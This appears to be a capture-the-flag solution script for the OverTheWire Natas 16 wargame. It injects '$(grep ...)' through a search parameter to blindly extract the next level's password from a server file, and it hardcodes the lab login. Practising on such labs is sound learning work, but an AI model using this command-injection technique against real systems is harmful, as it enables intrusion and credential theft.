#!/bin/python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters, string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "doomed"
for char in characters:
    uri = ''.join([url, '/?', 'needle=doomed$(grep ', char,
                  ' /etc/natas_webpass/natas17)&submit=Search'])
    r = requests.get(uri, auth=(auth_username, auth_password))
    if exists_str not in r.text:
        password_dictionary.append(char)
        print("Password Dictionary: {0}".format(''.join(password_dictionary)))
print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(password_dictionary)))

try_pw = ""
for i in range(65):
    in_len = len(try_pw)
    for char in password_dictionary:
        uri = ''.join([url, '/?', 'needle=doomed$(grep ^', try_pw, char,
                       ' /etc/natas_webpass/natas17)&submit=Search'])
        r = requests.get(uri, auth=(auth_username, auth_password))
        if exists_str not in r.text:
            try_pw += char
            print("Password: {0}".format(try_pw))
            break
    if (in_len == len(try_pw)):
        break

print("Hacking complete!")
print("Password: {0}".format(try_pw))
